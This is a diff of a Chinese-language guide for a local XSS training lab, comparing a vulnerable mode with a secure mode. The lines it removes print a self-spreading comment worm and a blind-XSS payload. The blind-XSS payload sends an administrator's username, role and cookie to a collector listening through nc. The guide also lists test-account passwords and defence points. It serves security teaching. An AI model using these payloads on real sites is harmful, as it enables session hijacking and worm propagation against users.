@@ -25,9 +25,9 @@ while true; do nc -l 7777; done
 ### 3. 测试账号
 | 用户名 | 密码 | 用途 |
 |--------|------|------|
-| alice | Admin#2025 | 场景 3（评论蠕虫） |
-| attacker | Attacker#2025 | 场景 4（Bio 钓鱼） |
-| admin | Admin#2025 | 场景 5（盲 XSS） |
+| admin | Admin#2025 | 场景 3（盲 XSS，管理员查看反馈触发） |
+| alice | Admin#2025 | 场景 4（评论蠕虫发起者） |
+| attacker | Attacker#2025 | 场景 5（Bio 钓鱼，个人主页 XSS） |
 
 ---
 
@@ -225,75 +225,6 @@ http://localhost:5173/search?q=<编码后的结果>
 
 ## 场景 5：伪造登录页钓鱼
 
-3. 在评论框粘贴以下 Payload：
-```html
-<img src=x onerror="
-(async()=>{
-  const cur = (location.pathname.match(/\/article\/(\d+)/)||[])[1];
-  if(!cur) return;
-  const mark = 'worm:' + cur;
-  if(localStorage.getItem(mark)) return;
-  localStorage.setItem(mark,'1');
-  
-  const seen = new Set();
-  document.querySelectorAll('a[href^=\"/article/\"]').forEach(a=>{
-    const m = (a.getAttribute('href').match(/\/article\/(\d+)/)||[])[1];
-    if(m && m!==cur) seen.add(m);
-  });
-  while(seen.size < 3) seen.add(String(Number(cur) + seen.size + 1));
-  const targets = [...seen].slice(0,3);
-  
-  const payload = this.outerHTML;
-  
-  for(const id of targets){
-    try{
-      await fetch(`/api/articles/${id}/comments`, {
-        method:'POST',
-        headers:{'Content-Type':'application/json'},
-        body: JSON.stringify({content: payload})
-      });
-    }catch(e){}
-  }
-  
-  new Image().src='http://127.0.0.1:7777/x?d='+btoa(JSON.stringify({where:'worm', from:cur, to:targets}));
-})();
-">
-```
-
-4. 点击「发表评论」
-
-5. 访问其他文章（如 `/article/2`、`/article/3`）观察传播
-
-### 预期结果
-- **VULN 模式**：
-  - 评论成功发表
-  - 蠕虫自动复制到 3 篇文章的评论区
-  - 收集器记录传播路径：
-    ```json
-    {"where":"worm", "from":"1", "to":["2","3","4"]}
-    ```
-  - `localStorage` 中有 `worm:1`、`worm:2` 等标记
-
-- **SECURE 模式**：
-  - 评论存储时被转义：`&lt;img src=x...&gt;`
-  - 前端渲染为纯文本
-  - 不执行，不传播
-
-### 技术亮点
-- **防重复**：`localStorage.setItem('worm:' + 文章ID, '1')`
-- **目标选择**：优先选页面上的文章链接，兜底用 ID+1/+2/+3
-- **可控传播**：最多传播到 3 个目标
-- **自我复制**：`this.outerHTML` 复制自身
-
-### 清理方法
-- 删除带毒评论
-- 清空 localStorage：`localStorage.clear()`
-- 或切换到 SECURE 模式
-
----
-
-## 场景 5：伪造登录页钓鱼
-
 ### 目标
 通过 CSS 伪造全屏登录界面，诱骗用户输入账号密码。
 
@@ -385,67 +316,7 @@ http://localhost:5173/search?q=<编码后的结果>
 - **三次验证**：前两次提示错误，第三次显示成功后移除覆盖
 - **Base64编码**：数据编码后上报，提高隐蔽性
 
----
 
-## 场景 5：盲 XSS 窃取管理员身份
-
-### 目标
-利用管理员查看反馈时的会话权限窃取凭证（管理员无感知）。
-
-### 攻击步骤
-1. 访问 `/feedback` 页面（无需登录）
-
-2. 填写反馈表单：
-   - **邮箱**：`evil@hacker.com`
-   - **反馈内容**：
-```html
-<img src=x onerror="
-fetch('/api/auth/me').then(r=>r.json()).then(j=>{
-  new Image().src='http://127.0.0.1:7777/x?d='+btoa(JSON.stringify({
-    where:'blind-admin',
-    username: j.username,
-    role: j.role,
-    cookie: document.cookie
-  }));
-});
-">
-```
-
-3. 点击「提交反馈」
-
-4. 使用 **admin** 账号登录
-
-5. 访问 `/admin/feedbacks`
-
-6. 点击刚才提交的反馈的「查看」按钮
-
-### 预期结果
-- **VULN 模式**：
-  - 管理员无感知（不弹窗）
-  - 收集器记录管理员信息：
-    ```json
-    {
-      "where":"blind-admin",
-      "username":"admin",
-      "role":"ADMIN",
-      "cookie":"access=eyJhbGc..."
-    }
-    ```
-
-- **SECURE 模式**：
-  - 反馈存储时被转义：`&lt;img src=x...&gt;`
-  - 前端渲染为纯文本
-  - 不执行，收集器无数据
-
-### 技术细节
-- **盲打**：攻击者不知道何时触发
-- **高价值目标**：管理员权限
-- **隐蔽性强**：无视觉反馈
-- **会话劫持**：获取 Cookie 可伪造管理员身份
-
-### 防御要点
-- **后端**：存储前进行 HTML 转义
-- **前端**：使用文本渲染而非 `v-html`
 
 ---
 
